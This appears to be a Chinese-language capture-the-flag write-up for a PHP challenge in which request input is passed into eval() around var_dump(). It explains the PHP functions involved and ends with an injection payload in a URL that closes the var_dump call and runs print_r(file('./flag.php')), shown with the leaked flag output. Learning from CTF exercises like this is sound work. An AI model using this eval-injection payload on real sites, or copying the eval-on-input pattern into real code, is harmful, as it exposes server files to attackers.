<?php
    include "flag.php";
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);");
    show_source(__FILE__);
  ?>
本题目涉及到如下几个函数：

1、$_REQUEST[] 函数

这个函数的官方解释如下：

默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。
因此我们只要使用POST或者GET任意一种方法就可以了。但是也需要注意的是，如果两种方法都被覆盖了，那么可能导致其中一种被覆盖（Overwrite)。例如：

<?php
$_GET['foo'] = 'hello';     //from user input
$_POST['foo'] = 'world';   //from user inputecho $_REQUEST['foo'];
此处会输出: world

// hello没有了是因为被world覆盖了。

2、var_dump() 函数 在官方的网站解释为：

This function displays structured information about one or more expressions that includes its type and value. Arrays and objects are explored recursively with values indented to show structure.
翻译出来就是 “此功能显示关于一个或多个表达式的结构化信息，包括其类型和值。 数组和对象以递归的方式递归地探索，其值用于显示结构。”

eg1【数组类型】:

<?
$a = array(1, 2, array("a", "b", "c"));
var_dump($a);
?>
此处输出：

array(3) {
  [0]=>
  int(1)
  [1]=>
  int(2)
  [2]=>
  array(3) {
    [0]=>    string(1) "a"
    [1]=>    string(1) "b"
    [2]=>    string(1) "c"
  }
}
eg2【字符串和数字类型】:

<?php
$b = 3.1;
$c = true;
var_dump($b, $c);
?>
此处输出：

float(3.1)
bool(true)
3、eval() 函数 该函数在W3school中的解释为：

eval() 函数把字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾。 如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。
该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。例如：

<?php
$string = "beautiful";
$time = "winter";
$str = 'This is a $string $time morning!';
echo $str. "<br />";
eval("\$str = \"$str\";");
echo $str;
?>
这里会输出：

This is a $string $time morning!
This is a beautiful winter morning!
解题

回到本小节一开始的代码，其主要是include了flag.php这个文件。然后获取用户的输入给$a变量，在用var_dump()打印处$a的变量类型和数值。（此处由于var_dump()的关系，使得eval失去了应有的作用，但是eval函数更多地是给我们暗示解题方法）

所以我们需要借助$a来使var_dump()函数失去作用。当然，此处还需要借助另外两个函数

5、print_r() 函数

官方解释：

Prints human-readable information about a variable
个人的感觉就是用方便人们阅读的形式来打印出信息。

例如：

<?php
$a = array ('a' => 'apple', 'b' => 'banana', 'c' => array ('x', 'y', 'z'));
print_r ($a);
?>
此处输出：

Array
(
    [a] => apple
    [b] => banana
    [c] => Array
        (
            [0] => x
            [1] => y
            [2] => z
        )
)
这里顺便简单区分下echo,print,print_r,var_dump的区别：

echo ,print的区别在于echo 可以输出多个变量值,而print只有一个变量，做为一个字符串输出。 另一点区别在于echo 没有返回值,print有返回值1。print不能输出数组和对象。

print_r可以输出stirng、int、float、array、object等，输出array时会用结构表示，print_r输出成功时返回true；
而且print_r可以通过print_r($str,true)来使print_r不输出而返回 print_r处理后的值。

var_dump 可以使用任何变量，包括字符串，数组，数字，对象，还指明变量的类型及长度。
6、file() 函数

file() 函数把整个文件读入一个数组中。

与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。

如果失败，则返回 false。
所以大致的思路就是：
1.用file函数加载flag.php
2.用print_r函数来打印flag.php文件
3.闭合原来的var_dump函数
4.让eval函数来执行我们构造的语句
构造URL：http://120.24.86.145:8003/?hello=);print_r(file("./flag.php")); //
结果输出：

Array ( [0] => $flag = 'Too Young Too Simple'; 
        [2] => # echo $flag; 
        [3] => # flag{bug-ctf-gg-99}; 
        [4] => ?> )